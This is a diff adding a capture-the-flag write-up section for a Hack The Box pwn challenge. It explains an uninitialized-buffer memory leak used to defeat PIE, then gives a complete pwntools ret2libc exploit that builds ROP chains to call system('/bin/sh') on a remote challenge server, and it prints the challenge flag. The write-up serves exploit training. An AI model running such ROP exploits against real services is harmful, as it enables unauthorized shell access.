@@ -70,6 +70,112 @@ p.interactive()
 <br />
 
 3. <p name="pwn3">Space pirate: Retribution (★☆☆☆)</p>
+So as a start, we check the binary security:
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/checksec_pwn3.png'>
+</p>
+
+Then, we run the binary to have a quick look on it. We get a menu with 2 options:
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/menu_pwn3.png'>
+</p>
+
+The first option does nothing but give us a static output, but the second option is a bit more interesting. We get asked for a new coordinate & our input gets reflected to us, as a start this might feel as a format string vulnerability but it's not.
+
+If we send a long enough string, we do get a segmentation fault!
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/segfault_pwn3.png'>
+</p>
+
+So that's a good start, but we do not have any leaks yet, remember that we have PIE (**P**osition **I**ndependant **E**xecutable) enabled, which means that we cannot use any hard coded addresses, since the binary is based on offsets & it'll be loaded with a random memory address base.
+
+Now, we'll need to find a memory leak. Let's head to Ghidra for some code analysis.
+
+Checking the `main`, we know that `missile_launcher` function correspond to our second menu option. Let's have a look at the reversed code:
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/ghidra_pwn3.png'>
+</p>
+
+If you look closely, you'll notice a small problem problem. `local_38` is declared at line 9 as a string but it was never initialized. An other thing to notice, is that we are using `read` which doesn't add a null byte (`\0`) at the end of the string & right after the `read`, we are printing the content of `local_38`.
+
+If we write nothing in the `local_38`, we can get a memory leak at that address, if we land on a null byte, we can add few more characters.
+
+Leak:
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/leak_pwn3.png'>
+</p>
+
+So when I first started testing locally, My leak was missing one more byte but when I switched to remote, I was getting a perfect leak so I continued to work on the remote. Note that the solver might not work if you run it on your machine because of this.
+
+So after some debuging, I found the address leaked & it's offset. After we got that, we can calculate our PIE Base & then do a basic ret2libc & what make things easier, we were given the libc. Solver:
+
+```python
+from pwn import *
+
+pop_rdi = 0x0000000000000d33
+ret = 0x0000000000000c38
+
+r = remote("157.245.46.136", 32149) # process('./sp_retribution') # 
+elf = ELF('./sp_retribution')
+libc = ELF('./glibc/libc.so.6')
+
+r.sendline(b"2")
+r.sendline(b"")
+
+r.recvuntil(b'99f], y = \n')
+r.readline()
+
+pie_base = r.readline().strip()
+
+print('PIE Leak             :', (pie_base))
+print('PIE Leak             :', len(pie_base))
+pie_base = u64((b"\x0a" + pie_base).ljust(8, b'\x00')) - elf.sym['__libc_csu_init'] - 58
+print('PIE Base             :', hex(pie_base))
+print('Main                 :', hex(pie_base+elf.sym['main']))
+
+payload1 = b"a" * 88
+payload1 += p64(pie_base+pop_rdi)
+payload1 += p64(pie_base+elf.got['puts'])
+payload1 += p64(pie_base+elf.plt['puts'])
+
+payload1 += p64(pie_base+elf.sym['missile_launcher'])
+
+r.send(payload1)
+
+r.recvuntil(b'have been reset!')
+r.readline()
+
+libc_leak = r.readline().strip()
+libc_base = u64(libc_leak.ljust(8, b'\x00')) - libc.sym['puts']
+
+print('')
+
+print('Libc Leak            :', (libc_leak))
+print('Libc Base            :', hex(libc_base))
+
+r.sendline(b"")
+
+payload2 = b"a"*88
+payload2 += p64(pie_base+pop_rdi)
+payload2 += p64(libc_base + next(libc.search(b'/bin/sh')))
+payload2 += p64(libc_base + libc.sym['system'])
+
+payload2 += p64(pie_base+elf.sym['main'])
+
+r.send(payload2)
+
+r.recvuntil(b' reset!')
+
+r.interactive()
+```
+
+Flag: `HTB{d0_n0t_3v3R_pr355_th3_butt0n}`
+
+<br/>
 
 4. <p name="pwn4">Vault-breaker (★☆☆☆)</p>
 
